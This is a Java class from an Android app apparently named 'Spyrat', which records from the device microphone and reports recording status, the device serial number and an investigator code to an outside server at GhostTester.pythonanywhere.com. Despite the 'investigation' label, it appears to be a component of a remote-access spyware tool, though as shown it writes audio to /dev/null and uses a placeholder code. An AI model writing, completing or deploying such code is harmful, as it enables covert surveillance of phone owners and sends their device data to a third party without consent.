package com.spyrat.investigation;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;
import org.json.JSONObject;
import java.io.IOException;

public class AudioRecorder {
    private static final String TAG = "SpyratAudio";
    private static MediaRecorder mediaRecorder;
    private static boolean isRecording = false;

    public static void startRecording(Context context, JSONObject parameters) {
        try {
            if (isRecording) {
                stopRecording(context);
            }

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile("/dev/null"); // Don't save file, just record

            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;

            Log.d(TAG, "🎤 Audio recording started");

            // Send recording status
            sendRecordingStatus(context, "started");

        } catch (IOException e) {
            Log.e(TAG, "❌ Audio recording failed: " + e.getMessage());
        }
    }

    public static void stopRecording(Context context) {
        try {
            if (mediaRecorder != null && isRecording) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;

                Log.d(TAG, "⏹️ Audio recording stopped");
                sendRecordingStatus(context, "stopped");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Stop recording error: " + e.getMessage());
        }
    }

    private static void sendRecordingStatus(Context context, String status) {
        try {
            JSONObject audioData = new JSONObject();
            audioData.put("action", "audio_recording");
            audioData.put("status", status);
            audioData.put("timestamp", System.currentTimeMillis());

            JSONObject postData = new JSONObject();
            postData.put("device_id", android.os.Build.SERIAL);
            postData.put("investigator_code", getInvestigatorCode(context));
            postData.put("data_type", "audio_status");
            postData.put("data_content", audioData);

            NetworkManager.sendPost("https://GhostTester.pythonanywhere.com/api/investigator/data", postData.toString());
        } catch (Exception e) {
            Log.e(TAG, "❌ Audio status send error: " + e.getMessage());
        }
    }

    private static String getInvestigatorCode(Context context) {
        return "INVESTIGATOR_CODE";
    }
}
